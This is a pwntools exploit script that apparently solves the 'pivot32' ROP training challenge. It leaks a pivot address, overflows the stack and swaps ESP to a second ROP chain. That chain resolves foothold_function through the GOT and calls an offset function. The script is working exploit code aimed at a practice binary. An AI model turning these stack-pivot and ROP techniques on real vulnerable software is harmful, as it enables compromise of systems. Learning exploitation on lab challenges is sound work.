#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pivot32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  '.'

io = start()

"""
0x0804874d: popal; cld; ret; 
0x0804882e: xchg eax, esp; ret; 
0x0804882c: pop eax; ret; 
0x08048830: mov eax, dword ptr [eax]; ret; 
0x080484a9: pop ebx; ret; 
0x08048833: add eax, ebx; ret; 
0x080485f0: call eax; 

"""

io.recvuntil("pivot:")
addr = int(io.recvuntil('\n')[:-1], 16)
pop_eax = p32(0x0804882c)
xchg_eax_esp = p32(0x0804882e)
popal = p32(0x0804874d)    #  pops values from stack in order EDI, ESI, EBP, ESP, EBX, EDX, ECX and EAX


foothold_plt = p32(0x8048520)        # use pwndbg>>plt
#foothold_plt_got = p32(0xf7fc877d)
foothold_plt_got = p32(0x804a024)    # use pwndbg>>got
mov_eax = p32(0x08048830)
pop_ebx = p32(0x080484a9)
add_eax_ebx = p32(0x08048833)
call_eax = p32(0x080485f0)

# Second Chain


io.recvuntil("> ")

buf = ""
buf += foothold_plt
buf += pop_eax
buf += foothold_plt_got
buf += mov_eax
buf += pop_ebx
buf += p32(0x1f7)
buf += add_eax_ebx
buf += call_eax

io.sendline(buf)


io.recvuntil("> ")

# First chain
s = ""
s += "\x90"*44
s += pop_eax
s += p32(addr)
s += xchg_eax_esp

write("first.txt", s)

io.sendline(s)

print(io.recvall())
io.interactive()

